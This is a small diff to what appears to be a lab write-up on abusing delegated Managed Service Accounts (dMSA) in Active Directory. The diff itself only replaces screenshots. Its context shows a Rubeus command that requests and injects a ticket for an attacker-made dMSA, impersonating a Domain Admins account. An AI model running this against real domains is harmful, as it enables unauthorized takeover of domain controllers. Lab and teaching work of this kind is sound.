@@ -17,9 +17,8 @@ Requesting the dMSA ticket can be done using the same command as specified in th
 Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/ludus.domain /opsec /dmsa /nowrap /ptt /ticket:doIFTDCCB.....
 ```
 
-<img width="1567" height="766" alt="image (2)" src="https://github.com/user-attachments/assets/795dc211-5e25-4555-91f5-57f7183aabdf" />
-
 With this ticket in memory, you inherit the privileges of the target account configured on the dMSA object. In our case, we're impersonating an account in the `Domain Admins` group, allowing us full control of the Domain Controller.
 
-<img width="920" height="347" alt="image" src="https://github.com/user-attachments/assets/0959585e-c6c5-4307-81ab-4419bb4f50c0" />
+<img width="1414" height="873" alt="2025-09-27 18_31_09-C__Users_lgoins_Desktop_2025-09-27 18_28_09-C__Users_lgoins_Desktop_image (3) pn" src="https://github.com/user-attachments/assets/a3d0a879-f6fe-4f67-837d-c85b0846b21e" />
+
 
